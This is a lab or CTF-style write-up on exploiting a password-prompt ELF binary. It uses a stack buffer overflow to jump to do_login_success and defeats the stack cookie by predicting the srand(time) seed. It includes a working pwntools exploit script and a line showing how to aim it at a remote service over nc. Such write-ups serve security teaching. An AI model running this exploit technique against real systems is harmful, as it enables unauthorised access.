# Task 3

In this task we have an ELF binary that asks for a password (almost the same as the binary from the first and second task). We have to buffer overflow it in order to manipulate it as we wish.

The user interaction is the same as in the first and second task with the correct length being "8".

Just like in the second task we have to overflow the return address of our main function and change it to another function from the binary called *do_login_success*, but now we have to bypass a stack cookie protection. Just like before we will open the binary using IDA.

![alt text](mainfunc.png?raw=true)

As you can see, differently from the previous tasks, in this binary is added one variable that is initialised with a global variable and the last if sequence that checks whether that variable was changed or not. If we lookup that variable "v12" we will see that it is being initialised with a random value within the *setup* function.

![alt text](stackcookie.png?raw=true)

Let's watch this variable inside edb-debugger and see if what can we do about it. We set a breakpoint at 0x0040126C where the v12 is being set.

![alt text](stackcookie2.png?raw=true)

In the image above we can see the "mov" instruction and the values corresponding (EAX and the value on the stack) highlighted. Now we go forward to the point where we will see our input on the stack and see how much we need to overflow in order to reach the return address, just like in the task 2.

![alt text](stackcookie3.png?raw=true)

As we can see in the image above, in order to reach the return address we have to try to set the "v12" value from the stack the same. But if we run this multiple times, we see that every time the value is different. So in order to bypass this i searched on the web and found this youtube video (https://www.youtube.com/watch?v=aE6GfLRP_e0&t=570s). It basically says that *srand* function is a deterministic function and if we run this same function at the same time (the same second), but in another program, we will get the same seed and the *rand* function will produce the same value. So if we try to recreate this technique but for our binary (looking back at the debugger stack, just like we did in the second task with retrieving the *do_login_success* address) we will need 8 bytes of "A",  36 bytes of zero, 4 bytes of cookie, 8 bytes of zero, and the new return address written in the form of 8 bytes. The python code will look like this:

```
from ctypes import *
from pwn import *

io = process("./task3")

libc = cdll.LoadLibrary('libc.so.6')
libc.srand(libc.time(0))
cookie_value = libc.rand()
cookie_str = str(hex(cookie_value))
good_cookie_str = cookie_str[8:10] + cookie_str[6:8] + cookie_str[4:6] + cookie_str[2:4]
cookie_bytes = bytes.fromhex(good_cookie_str)

io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()

io.sendline(b'\x41'*8 + b'\x00'*36 + cookie_bytes + b'\x00'*8 + b'\xf6\x11\x40\x00' + b'\x00'*4)

hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)
```

![alt text](cracked.png?raw=true)

If we want to exploit a remote service we would change the process function with the following:

```
io = process(["/bin/nc", "ip", "port"])
```

